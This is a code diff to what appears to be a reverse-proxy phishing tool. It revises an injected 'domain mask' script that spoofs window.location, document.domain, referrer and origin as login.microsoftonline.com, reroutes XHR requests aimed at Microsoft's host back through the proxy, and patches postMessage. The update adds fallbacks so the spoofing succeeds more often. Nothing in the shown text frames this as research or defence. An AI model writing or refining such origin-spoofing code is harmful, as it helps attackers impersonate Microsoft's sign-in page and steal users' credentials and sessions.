@@ -81,63 +81,110 @@ const PROXY_PATHNAMES = {
 const DOMAIN_MASK_SCRIPT = `
 (function() {
     'use strict';
-    const fakeOrigin = 'https://login.microsoftonline.com';
-    const fakeHostname = 'login.microsoftonline.com';
-    const fakeHost = 'login.microsoftonline.com';
-    const fakeProtocol = 'https:';
-    const loc = window.location;
-    const newLocation = Object.create(loc, {
-        origin: { get: () => fakeOrigin, configurable: false },
-        hostname: { get: () => fakeHostname, configurable: false },
-        host: { get: () => fakeHost, configurable: false },
-        protocol: { get: () => fakeProtocol, configurable: false },
-        href: {
-            get: () => fakeOrigin + loc.pathname + loc.search + loc.hash,
-            set: (v) => { loc.href = v; },
-            configurable: false
-        },
-        ancestorOrigins: { get: () => new DOMStringList([fakeOrigin]), configurable: false }
-    });
-    try { delete window.location; } catch(e) {}
-    Object.defineProperty(window, 'location', {
-        get: () => newLocation,
-        set: (v) => { loc.href = v; },
-        configurable: false,
-        enumerable: true
-    });
-    Object.defineProperty(document, 'domain', {
-        get: () => fakeHostname,
-        set: () => {},
-        configurable: false
-    });
-    Object.defineProperty(document, 'referrer', {
-        get: () => fakeOrigin + '/',
-        configurable: false
-    });
-    Object.defineProperty(window, 'origin', {
-        get: () => fakeOrigin,
-        configurable: false
-    });
-    Object.defineProperty(window, 'self', { get: () => window, configurable: false });
-    Object.defineProperty(window, 'top', { get: () => window, configurable: false });
-    Object.defineProperty(window, 'parent', { get: () => window, configurable: false });
-    const origFetch = window.fetch;
+    var fakeOrigin = 'https://login.microsoftonline.com';
+    var fakeHostname = 'login.microsoftonline.com';
+    var fakeHost = 'login.microsoftonline.com';
+    var fakeProtocol = 'https:';
+
+    // 1. Override window.location properties (if possible)
+    try {
+        var loc = window.location;
+        Object.defineProperty(loc, 'origin', {
+            get: function() { return fakeOrigin; },
+            configurable: true
+        });
+        Object.defineProperty(loc, 'hostname', {
+            get: function() { return fakeHostname; },
+            configurable: true
+        });
+        Object.defineProperty(loc, 'host', {
+            get: function() { return fakeHost; },
+            configurable: true
+        });
+        Object.defineProperty(loc, 'protocol', {
+            get: function() { return fakeProtocol; },
+            configurable: true
+        });
+        Object.defineProperty(loc, 'href', {
+            get: function() { return fakeOrigin + loc.pathname + loc.search + loc.hash; },
+            set: function(v) { loc.href = v; },
+            configurable: true
+        });
+        // ancestorOrigins is read-only, but we can try to override
+        try {
+            Object.defineProperty(loc, 'ancestorOrigins', {
+                get: function() { return new DOMStringList([fakeOrigin]); },
+                configurable: true
+            });
+        } catch(e) {}
+    } catch(e) {
+        // If individual property definition fails, try to replace the whole location
+        try {
+            var loc2 = window.location;
+            var fakeLocation = Object.create(loc2, {
+                origin: { get: function() { return fakeOrigin; } },
+                hostname: { get: function() { return fakeHostname; } },
+                host: { get: function() { return fakeHost; } },
+                protocol: { get: function() { return fakeProtocol; } },
+                href: {
+                    get: function() { return fakeOrigin + loc2.pathname + loc2.search + loc2.hash; },
+                    set: function(v) { loc2.href = v; }
+                }
+            });
+            Object.defineProperty(window, 'location', {
+                get: function() { return fakeLocation; },
+                set: function(v) { loc2.href = v; },
+                configurable: true
+            });
+        } catch(e2) {}
+    }
+
+    // 2. Override document.domain
+    try {
+        Object.defineProperty(document, 'domain', {
+            get: function() { return fakeHostname; },
+            set: function() {},
+            configurable: true
+        });
+    } catch(e) {}
+
+    // 3. Override document.referrer
+    try {
+        Object.defineProperty(document, 'referrer', {
+            get: function() { return fakeOrigin + '/'; },
+            configurable: true
+        });
+    } catch(e) {}
+
+    // 4. Override window.origin
+    try {
+        Object.defineProperty(window, 'origin', {
+            get: function() { return fakeOrigin; },
+            configurable: true
+        });
+    } catch(e) {}
+
+    // 5. Patch fetch and XHR
+    var origFetch = window.fetch;
     window.fetch = function(input, init) {
-        let url = typeof input === 'string' ? input : input.url;
+        var url = typeof input === 'string' ? input : input.url;
         if (url && (url.includes('login.microsoftonline.com') || url.startsWith('/'))) {
             return origFetch.call(this, input, init);
         }
         return origFetch.call(this, input, init);
     };
-    const origXHROpen = XMLHttpRequest.prototype.open;
+
+    var origXHROpen = XMLHttpRequest.prototype.open;
     XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
         if (typeof url === 'string' && url.includes('login.microsoftonline.com')) {
-            const urlObj = new URL(url);
+            var urlObj = new URL(url);
             url = urlObj.pathname + urlObj.search + urlObj.hash;
         }
         return origXHROpen.call(this, method, url, async !== false, user, password);
     };
-    const origPostMessage = window.postMessage;
+
+    // 6. Patch postMessage
+    var origPostMessage = window.postMessage;
     window.postMessage = function(message, targetOrigin, transfer) {
         if (targetOrigin === '*') return origPostMessage(message, targetOrigin, transfer);
         if (targetOrigin && targetOrigin.includes('microsoftonline.com')) {
@@ -145,7 +192,8 @@ const DOMAIN_MASK_SCRIPT = `
         }
         return origPostMessage(message, targetOrigin, transfer);
     };
-    console.log('[DOMAIN MASK] Active – all origins now report as ' + fakeOrigin);
+
+    console.log('[DOMAIN MASK] Active – origins now report as ' + fakeOrigin);
 })();
 `.replace(/<\/script>/gi, '<\\/script>');
 
